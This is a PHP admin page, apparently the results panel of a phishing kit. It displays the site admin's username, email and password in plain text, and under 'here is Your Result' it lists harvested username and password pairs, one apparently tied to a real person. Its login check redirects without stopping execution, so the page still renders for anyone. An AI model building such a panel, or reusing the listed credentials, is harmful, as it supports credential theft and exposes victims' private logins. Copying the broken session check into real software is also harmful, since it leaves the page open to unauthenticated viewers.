<?php
include 'config.php';
session_start();
if ($_SESSION['user'] == "") {
    header('location: index.php');
}
$off = $_GET['account'];
if (isset($off)) {
    if ($off == 'off') {
        session_destroy();
        unset($_SESSION['user']);
        session_unset();
        header('location: index.php');
    } else {
        echo '';
    }
}
?>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="viewport" content="width=device.width" />





<!DOCTYPE html>
<html>
    <head>
        
        <script src="https://kit.fontawesome.com/d55046ac39.js"></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

            <title>Site AdminPanel</title>

        <!-- Bootstrap CSS CDN -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
        <!-- Our Custom CSS -->
        <link rel="stylesheet" href="style2.css">
        <!-- Scrollbar Custom CSS -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/malihu-custom-scrollbar-plugin/3.1.5/jquery.mCustomScrollbar.min.css">
<style>
    .myButton {
	-moz-box-shadow:inset 0px 1px 0px 0px #ffffff;
	-webkit-box-shadow:inset 0px 1px 0px 0px #ffffff;
	box-shadow:inset 0px 1px 0px 0px #ffffff;
	background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #ededed), color-stop(1, #dfdfdf));
	background:-moz-linear-gradient(top, #ededed 5%, #dfdfdf 100%);
	background:-webkit-linear-gradient(top, #ededed 5%, #dfdfdf 100%);
	background:-o-linear-gradient(top, #ededed 5%, #dfdfdf 100%);
	background:-ms-linear-gradient(top, #ededed 5%, #dfdfdf 100%);
	background:linear-gradient(to bottom, #ededed 5%, #dfdfdf 100%);
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ededed', endColorstr='#dfdfdf',GradientType=0);
	background-color:#ededed;
	-moz-border-radius:6px;
	-webkit-border-radius:6px;
	border-radius:6px;
	border:1px solid #dcdcdc;
	display:inline-block;
	cursor:pointer;
	color:#777777;
	font-family:Arial;
	font-size:18px;
	font-weight:bold;
	padding:6px 24px;
	text-decoration:none;
	text-shadow:0px 1px 0px #ffffff;
}
.myButton:hover {
	background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #dfdfdf), color-stop(1, #ededed));
	background:-moz-linear-gradient(top, #dfdfdf 5%, #ededed 100%);
	background:-webkit-linear-gradient(top, #dfdfdf 5%, #ededed 100%);
	background:-o-linear-gradient(top, #dfdfdf 5%, #ededed 100%);
	background:-ms-linear-gradient(top, #dfdfdf 5%, #ededed 100%);
	background:linear-gradient(to bottom, #dfdfdf 5%, #ededed 100%);
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#dfdfdf', endColorstr='#ededed',GradientType=0);
	background-color:#dfdfdf;
}
.myButton:active {
	position:relative;
	top:1px;
}


</style>
<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5dcbabd2869127ad"></script>
    </head>
    <body>




        <div class="wrapper">
           <center>
                <h2>Site Infomation</h2>
                <p>Admin Username:- <?php echo $name;   ?><br>
                Admin eMail:- <?php echo $admin;   ?><br>
                Admin Password:- <?php echo $pass_word;   ?><br></p>
  <div class="separator" style="clear: both; text-align: center;">
<a " target="_blank"><img border="0" data-original-height="400" data-original-width="75" height="75" src="https://1.bp.blogspot.com/-_4aixTOVzCg/XPv_nzBpm2I/AAAAAAAAAa0/Np2F6Gyp7F0-0VMgLMw7d37JDAYc5NHoACLcBGAs/s200/LargeThunderousDeviltasmanian-small.gif" width="75" /></a></div>

<br>
<a href="?account=off" class="myButton">Logout</a><br>


<h4 style="text-align: center;">
<b><i><span style="font-size: large;">here is Your Result</span></i></b></h4>
username=rizwanpassword=rathore</center> <center><br>username=fuckpassword=fuck</center> <center><br>username=saksham_bhardwaj 0160password=471284435</center> <center><br>